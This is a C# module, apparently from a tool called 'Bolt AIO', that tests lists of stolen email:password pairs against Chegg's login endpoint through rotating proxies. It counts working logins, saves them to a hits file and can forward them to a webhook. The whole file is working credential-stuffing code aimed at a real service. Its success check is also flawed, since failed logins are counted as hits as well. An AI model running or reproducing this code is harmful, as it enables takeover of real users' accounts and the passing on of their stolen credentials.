using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class cheggmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var cookieStorage2 = req.Cookies = new CookieStorage();
                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36";
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                            req.Referer =
                                "https://www.chegg.com/auth?action=login&redirect=https%3A%2F%2Fwww.chegg.com%2F&reset_password=0";
                            var res = req.Post(new Uri("https://auth.chegg.com/auth/_ajax/auth/v1/login?clientId=CHGG"),
                                new BytesContent(Encoding.Default.GetBytes(
                                    "clientId=CHGG&redirect_uri=&state=&responseType=&email=" + array[0] +
                                    "&password=" + array[1] + "&version=2.121.22&profileId=CHGG")));
                            var text2 = res.ToString();
                            if (!text2.Contains("uuid\""))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }

                            Program.Hits++;
                            Program.TotalChecks++;

                            if (Program.lorc == "LOG") Settings.PrintHit("Chegg", array[0] + ":" + array[1]);
                            Export.AsResult("/Chegg_hits", array[0] + ":" + array[1]);
                            if (Settings.sendToWebhook)
                                Settings.sendTowebhook1(array[0] + ":" + array[1], "Chegg Hits");
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}